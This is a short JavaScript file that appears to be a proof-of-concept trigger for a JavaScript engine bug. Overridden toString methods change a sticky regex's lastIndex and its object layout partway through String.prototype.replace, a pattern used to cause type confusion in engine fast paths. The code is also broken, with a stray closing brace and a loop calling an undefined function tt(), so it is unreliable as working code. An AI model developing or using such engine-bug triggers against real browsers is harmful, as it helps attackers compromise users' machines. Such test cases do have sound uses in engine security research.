var evil_o = {};
var reg = /abc/y;
var num = {};
num.toString = function(){
	change_to_dict();
	return 0x0;
}


function change_to_dict(){
	for(var i = 0;i < 0x100;i++){
		reg["a"+i.toString(16)] = i;
	}
}
evil_o.toString = function(){
	//change_to_dict();
	reg.lastIndex = num;
	return "abc".repeat(0x1000);
}

String.prototype.replace.call(evil_o,reg,function(){});
}
alert(22);
for(var i = 0;i < 0x1000;i++){
	tt();
}

alert("1");